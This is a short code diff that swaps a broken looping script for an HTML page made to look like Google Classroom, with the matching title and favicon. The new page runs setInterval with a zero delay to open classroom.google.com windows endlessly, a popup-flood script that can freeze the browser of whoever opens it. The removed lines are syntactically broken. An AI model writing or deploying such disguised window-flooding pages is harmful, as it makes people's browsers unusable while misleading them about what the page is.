@@ -1,12 +1,18 @@
-<script>
-// Initiate an infinite loop
-while (true) {
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Classroom</title>
+    <link rel="icon" href="https://www.gstatic.com/classroom/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <script>
+        function openGoogleClassroom() {
+            window.open("https://classroom.google.com");
+        }
 
-window.open('classroom.google.com')
+        // Continuously open classroom.google.com in a loop
+        setInterval(openGoogleClassroom, 0);
+    </script>
+</body>
+</html>
 
-	}, "17");
-window.open('classroom.google.com')
-		
-	}
-}
-</script>
